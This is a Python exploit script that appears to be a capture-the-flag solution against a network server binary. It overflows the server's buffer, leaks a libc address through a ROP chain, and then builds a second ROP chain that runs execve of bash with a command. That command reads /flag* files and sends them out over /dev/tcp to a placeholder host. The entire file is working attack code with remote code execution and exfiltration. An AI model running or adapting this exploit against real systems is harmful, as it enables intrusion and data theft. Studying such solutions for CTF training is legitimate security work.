from ptrlib import *
import os

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "9080")
cmd = b"/bin/cat /flag* > /dev/tcp/XXXX/YYYY"

libc = ELF("../distfiles/libc-2.31.so")
elf = ELF("../distfiles/server")
rop_csu_popper = 0x401c8a
rop_csu_caller = 0x401c70

# 1. libc leak
sock = Socket(HOST, int(PORT))

payload  = b'A'*0xff + b'\r'
payload += b'A'*0x38
payload += p64(rop_csu_popper)
for fd in range(4, 4+10):
    payload += flat([
        0, 1, fd, elf.got('write'), 8, elf.got('write'),
        rop_csu_caller, 0xdeadbeef
    ], map=p64)
payload += b'\r\n'
sock.send(payload)
sock.recvuntil("</html>\n")

libc_base = u64(sock.recvonce(8)) - libc.symbol("write")
logger.info("libc = " + hex(libc_base))
libc.set_base(libc_base)
sock.close()

# 2. ROP
sock = Socket(HOST, int(PORT))

addr_pexecve = elf.section(".bss") + 0x300
addr_struct = elf.section(".bss") + 0x400
rop_add_prbpM3Dh_ebx = 0x004015cc
rop_pop_rbx_rbp_r12_r13_r14 = 0x00401691

payload  = b'A'*0xff + b'\r'
payload += b'A'*0x38
# prepare execve pointer
# (we don't use system because env vars are likely broken by stack bof)
payload += flat([
    rop_pop_rbx_rbp_r12_r13_r14,
    libc.symbol('execve') & 0xffffffff, addr_pexecve+0x3d, 12, 13, 14,
    rop_add_prbpM3Dh_ebx,
    rop_pop_rbx_rbp_r12_r13_r14,
    libc.symbol('execve') >> 32, addr_pexecve+0x3d+4, 12, 13, 14,
    rop_add_prbpM3Dh_ebx
], map=p64)
# prepare argv
struct  = p64(addr_struct + 0x20) # /bin/bash
struct += p64(addr_struct + 0x2a) # -c
struct += p64(addr_struct + 0x2d) # <cmd>
struct += p64(0)
struct += b'/bin/bash\0'
struct += b'-c\0'
struct += cmd
for i,block in enumerate(chunks(struct, 4, b'\0')):
    payload += flat([
        rop_pop_rbx_rbp_r12_r13_r14,
        u32(block), addr_struct+0x3d+i*4, 12, 13, 14,
        rop_add_prbpM3Dh_ebx
    ], map=p64)
# execve("/bin/bash", {"/bin/bash", "-c", "<cmd>"}, NULL)
payload += flat([
    rop_csu_popper,
    0, 1, addr_struct + 0x20, addr_struct, 0, addr_pexecve,
    rop_csu_caller,
], map=p64)
payload += b'\r\n'
sock.send(payload)
sock.recvuntil("</html>\n")

sock.close()
